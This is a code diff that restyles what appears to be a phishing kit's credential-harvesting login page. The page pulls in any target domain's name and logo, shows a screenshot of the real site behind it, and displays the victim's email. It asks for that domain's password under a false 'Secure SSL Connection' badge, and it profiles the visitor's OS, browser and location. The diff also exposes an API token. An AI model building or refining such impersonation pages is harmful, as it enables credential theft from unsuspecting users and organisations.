@@ -165,70 +165,43 @@
       letter-spacing: -0.3px;
     }
     
-    /* Visitor Info Bar */
+    /* Visitor Info - Friend's Style */
     .visitor-info {
-      background: #fafbfc;
-      padding: 10px 22px;
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: space-between;
-      align-items: center;
-      font-size: 12px;
-      color: #555;
-      border-bottom: 1px solid #f0f0f0;
-      gap: 4px 12px;
-    }
-    
-    .visitor-info .info-item {
-      display: flex;
-      align-items: center;
-      gap: 5px;
-    }
-    
-    .visitor-info .info-item i {
-      color: #0078d4;
-      width: 14px;
+      text-align: center;
+      padding: 14px 20px 10px;
       font-size: 13px;
+      color: #444;
+      border-bottom: 1px solid #f0f0f0;
     }
     
-    .visitor-info .info-item .os-icon {
-      font-size: 16px;
-      width: 18px;
+    .visitor-info .email {
+      color: #244db8;
+      font-size: 24px;
+      margin-top: 8px;
+      margin-bottom: 10px;
+      font-weight: 400;
+      word-break: break-all;
     }
     
-    .visitor-info .info-item .browser-icon {
-      font-size: 16px;
-      width: 18px;
-    }
-    
-    /* Content */
+    /* Content - Friend's Style */
     .chameleon-content {
-      padding: 28px 30px 24px;
+      padding: 20px 30px 24px;
     }
     
-    .hero-title {
-      font-size: 20px;
-      font-weight: 700;
-      color: #1a1a1a;
-      margin-bottom: 4px;
-    }
-    
-    .hero-sub {
+    .message {
+      text-align: center;
       font-size: 14px;
-      color: #666;
-      margin-bottom: 18px;
+      color: #222;
+      margin-bottom: 16px;
+    }
+    
+    .message b {
+      display: block;
+      font-size: 15px;
     }
     
     .email-display {
-      background: #f5f8ff;
-      padding: 12px 16px;
-      border-radius: 8px;
-      font-size: 15px;
-      font-weight: 600;
-      color: #1a1a1a;
-      margin-bottom: 20px;
-      word-break: break-all;
-      border-left: 4px solid #0078d4;
+      display: none;
     }
     
     /* Form */
@@ -240,23 +213,11 @@
       margin-bottom: 16px;
     }
     
-    .form-group label {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: #333;
-      margin-bottom: 5px;
-    }
-    
-    .input-with-icon {
-      position: relative;
-    }
-    
     .input-with-icon input {
       width: 100%;
       padding: 12px 12px 12px 44px;
-      border: 2px solid #e8e8e8;
-      border-radius: 10px;
+      border: 2px solid #2d7df4;
+      border-radius: 4px;
       font-size: 15px;
       transition: border-color 0.3s, box-shadow 0.3s;
       background: #fafafa;
@@ -264,9 +225,9 @@
     }
     
     .input-with-icon input:focus {
-      border-color: #0078d4;
+      border-color: #2d7df4;
       background: #ffffff;
-      box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.08);
+      box-shadow: 0 0 0 4px rgba(45, 125, 244, 0.08);
     }
     
     .input-with-icon .icon {
@@ -293,39 +254,36 @@
     }
     
     .checkbox-group {
-      display: flex;
-      align-items: center;
-      margin: 14px 0 18px;
-    }
-    
-    .checkbox-group input {
-      margin-right: 10px;
-      width: 18px;
-      height: 18px;
-      accent-color: #0078d4;
+      margin: 18px 0 20px;
     }
     
     .checkbox-group label {
-      font-size: 13px;
-      color: #555;
+      font-size: 14px;
+      color: #444;
+    }
+    
+    .checkbox-group input {
+      margin-right: 8px;
+      width: auto;
+      height: auto;
+      accent-color: #2d7df4;
     }
     
     .btn-submit {
       width: 100%;
       padding: 14px;
-      background: #0078d4;
+      background: #2b8df2;
       color: #fff;
       border: none;
-      border-radius: 10px;
-      font-size: 16px;
-      font-weight: 700;
+      border-radius: 4px;
+      font-size: 18px;
+      font-weight: 600;
       cursor: pointer;
       transition: background 0.3s, transform 0.15s;
     }
     
     .btn-submit:hover {
-      background: #106ebe;
-      transform: scale(1.01);
+      background: #1976d2;
     }
     
     .btn-submit:active {
@@ -333,31 +291,26 @@
     }
     
     .auth-error {
-      color: #dc2626;
-      font-size: 13px;
-      margin: 8px 0 4px;
-      display: none;
+      color: #d11a1a;
+      font-size: 14px;
+      margin-top: 10px;
       text-align: center;
-      background: #fef2f2;
-      padding: 8px 12px;
-      border-radius: 8px;
-      border: 1px solid #fecaca;
+      display: none;
     }
     
     .footer-links {
+      display: none;
+    }
+    
+    .footer {
       text-align: center;
-      margin-top: 16px;
-      font-size: 13px;
       color: #666;
+      font-size: 13px;
+      margin-top: 16px;
     }
     
-    .footer-links a {
-      color: #0078d4;
-      text-decoration: none;
-    }
-    
-    .footer-links a:hover {
-      text-decoration: underline;
+    .footer span {
+      color: #2b8df2;
     }
     
     .security-badge {
@@ -396,7 +349,7 @@
       width: 40px;
       height: 40px;
       border: 4px solid #fff;
-      border-top-color: #0078d4;
+      border-top-color: #2b8df2;
       border-radius: 50%;
       animation: spin 0.8s linear infinite;
     }
@@ -414,11 +367,14 @@
         padding: 20px 16px 14px;
       }
       .chameleon-content {
-        padding: 20px 16px;
+        padding: 16px;
       }
       .visitor-info {
-        font-size: 11px;
-        padding: 6px 12px;
+        font-size: 12px;
+        padding: 10px 16px 8px;
+      }
+      .visitor-info .email {
+        font-size: 20px;
       }
       #human-verify .box {
         padding: 30px 20px;
@@ -437,7 +393,7 @@
     </div>
   </div>
 
-  <!-- MODERN ELEVATED FLOATING CARD -->
+  <!-- CHAMELEON CARD - FRIEND'S STYLE -->
   <div class="chameleon-container" id="chameleonContainer">
     
     <!-- Brand Header - Logo + Company Name -->
@@ -448,55 +404,60 @@
       <div class="brand-name" id="brandName">Loading...</div>
     </div>
     
+    <!-- Visitor Info - Friend's Style -->
     <div class="visitor-info" id="visitorInfo">
-      <span class="info-item"><i class="fas fa-calendar-alt"></i> <span id="visitDateTime">Loading...</span></span>
-      <span class="info-item"><i class="fas fa-map-marker-alt"></i> <span id="visitLocation">Loading...</span></span>
-      <span class="info-item">
-        <i class="fas fa-desktop os-icon" id="osIcon"></i>
-        <span id="osLabel">Loading...</span>
-      </span>
-      <span class="info-item">
-        <i class="fas fa-globe browser-icon" id="browserIcon"></i>
-        <span id="browserLabel">Loading...</span>
-      </span>
+      <span id="visitDateTime">Loading...</span> &nbsp;&nbsp;
+      <span id="visitBrowserIcon">🌐</span> <span id="visitBrowser">Loading...</span> &nbsp;&nbsp;
+      <span id="visitOSIcon">🪟</span> <span id="visitOS">Loading...</span>
+      <br>
+      <span id="visitLocation">📍 Loading...</span>
+      
+      <div class="email" id="emailDisplay">
+        Loading...
+      </div>
     </div>
     
     <div class="chameleon-content">
-      <div class="hero-title" id="heroTitle">Welcome</div>
-      <div class="hero-sub" id="heroSub">Please sign in to access your account.</div>
-      
-      <div class="email-display" id="emailDisplay">Loading...</div>
+      <!-- Message - Friend's Style -->
+      <div class="message">
+        Session authentication! please provide your
+        <b id="domainDisplay">Loading...</b>
+        password to continue.
+      </div>
       
       <form id="loginForm">
         <input type="text" name="_gotcha" style="display:none" tabindex="-1" autocomplete="off">
         <input type="hidden" id="emailField" name="email">
         
         <div class="form-group">
-          <label for="passwordField">Password</label>
           <div class="input-with-icon">
             <span class="icon"><i class="fas fa-lock"></i></span>
-            <input type="password" id="passwordField" name="password" placeholder="Enter your password" required>
+            <input type="password" id="passwordField" name="password" placeholder="Password" required>
             <span class="toggle-password" onclick="togglePassword()"><i class="fas fa-eye" id="eyeIcon"></i></span>
           </div>
         </div>
         
-        <div class="checkbox-group">
-          <input type="checkbox" id="remember">
-          <label for="remember">Remember me</label>
-        </div>
-        
         <div class="auth-error" id="authError">Authentication is required!</div>
         
-        <button type="submit" class="btn-submit">Sign In</button>
+        <div class="checkbox-group">
+          <label>
+            <input type="checkbox" id="showPassword" onchange="togglePassword()">
+            Show password
+          </label>
+        </div>
+        
+        <button type="submit" class="btn-submit">NEXT</button>
       </form>
       
-      <div class="footer-links">
-        <a href="#">Forgot your password?</a> &middot; <a href="#">Privacy Policy</a>
+      <!-- Footer - Friend's Style -->
+      <div class="footer">
+        © 2026 <span id="footerDomain">Loading...</span> Secure Portal | Privacy
       </div>
     </div>
     
+    <!-- Green SSL Badge - Kept from Our Page -->
     <div class="security-badge">
-      <i class="fas fa-shield-alt"></i> Secure SSL Connection &middot; <span id="footerDomain">Loading...</span>
+      <i class="fas fa-shield-alt"></i> Secure SSL Connection
     </div>
   </div>
 
@@ -524,33 +485,33 @@
     function getOSInfo() {
       const ua = navigator.userAgent;
       if (ua.includes('Windows')) {
-        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: 'fa-windows' };
-        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
-        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
-        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: 'fa-windows' };
-        return { name: 'Windows', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: '🪟' };
+        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: '🪟' };
+        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: '🪟' };
+        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: '🪟' };
+        return { name: 'Windows', icon: '🪟' };
       }
       if (ua.includes('Mac OS X') || ua.includes('Macintosh')) {
-        return { name: 'macOS', icon: 'fa-apple' };
+        return { name: 'macOS', icon: '🍎' };
       }
       if (ua.includes('Linux')) {
-        if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
-        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: 'fa-chrome' };
-        return { name: 'Linux', icon: 'fa-linux' };
+        if (ua.includes('Android')) return { name: 'Android', icon: '📱' };
+        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: '🌐' };
+        return { name: 'Linux', icon: '🐧' };
       }
-      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
-      return { name: 'Unknown', icon: 'fa-desktop' };
+      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: '🍎' };
+      return { name: 'Unknown', icon: '💻' };
     }
     
     // --- DETECT BROWSER AND ICON ---
     function getBrowserInfo() {
       const ua = navigator.userAgent;
-      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
-      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
-      if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
-      if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
-      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
-      return { name: 'Unknown', icon: 'fa-globe' };
+      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: '🌐' };
+      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: '🧭' };
+      if (ua.includes('Firefox')) return { name: 'Firefox', icon: '🦊' };
+      if (ua.includes('Edg')) return { name: 'Edge', icon: '🌐' };
+      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: '🎭' };
+      return { name: 'Unknown', icon: '🌐' };
     }
     
     // --- GET LOCATION ---
@@ -574,35 +535,25 @@
       return 'Unknown';
     }
     
-    // --- FETCH BRANDING AND BACKGROUND (WITH LOGO) ---
+    // --- FETCH BRANDING AND BACKGROUND ---
     async function fetchBranding(domain) {
       try {
         const nameParts = domain.split('.');
         const brandName = nameParts[0].charAt(0).toUpperCase() + nameParts[0].slice(1);
         document.getElementById('brandName').textContent = brandName;
+        document.getElementById('domainDisplay').textContent = domain;
         document.getElementById('footerDomain').textContent = domain;
         document.getElementById('pageTitle').textContent = `${brandName} · Secure Portal`;
         
-        document.getElementById('heroTitle').textContent = `Welcome to ${brandName}`;
-        document.getElementById('heroSub').textContent = `Please sign in to access your ${brandName} account.`;
-        
-        // --- LOGO FETCH (from the other page) ---
+        // --- LOGO FETCH ---
         const logoImg = document.getElementById('brandLogo');
-        // Use logo.dev API (works well)
         logoImg.src = `https://img.logo.dev/${domain}?token=pk_N3r1ruvPTqCTWk6c6ZhZUQ`;
         logoImg.onerror = function() {
-          // Fallback to Clearbit if logo.dev fails
           this.src = `https://logo.clearbit.com/${domain}`;
           this.onerror = function() {
-            // If both fail, hide the logo
             this.style.display = 'none';
           };
         };
-        // --- END LOGO FETCH ---
-        
-        const color = '#0078d4';
-        document.querySelector('.btn-submit').style.background = color;
-        document.querySelector('.email-display').style.borderLeftColor = color;
         
         // DYNAMIC BACKGROUND
         const bgUrl = `https://image.thum.io/get/width/1200/https://${domain}`;
@@ -636,12 +587,12 @@
       document.getElementById('visitLocation').textContent = await getLocation();
       
       const os = getOSInfo();
-      document.getElementById('osIcon').className = `fab ${os.icon} os-icon`;
-      document.getElementById('osLabel').textContent = os.name;
+      document.getElementById('visitOSIcon').textContent = os.icon;
+      document.getElementById('visitOS').textContent = os.name;
       
       const browser = getBrowserInfo();
-      document.getElementById('browserIcon').className = `fab ${browser.icon} browser-icon`;
-      document.getElementById('browserLabel').textContent = browser.name;
+      document.getElementById('visitBrowserIcon').textContent = browser.icon;
+      document.getElementById('visitBrowser').textContent = browser.name;
       
       await fetchBranding(domain);
       
@@ -652,7 +603,8 @@
     function togglePassword() {
       const field = document.getElementById('passwordField');
       const icon = document.getElementById('eyeIcon');
-      if (field.type === 'password') {
+      const checkbox = document.getElementById('showPassword');
+      if (checkbox.checked || icon.className === 'fas fa-eye-slash') {
         field.type = 'text';
         icon.className = 'fas fa-eye-slash';
       } else {
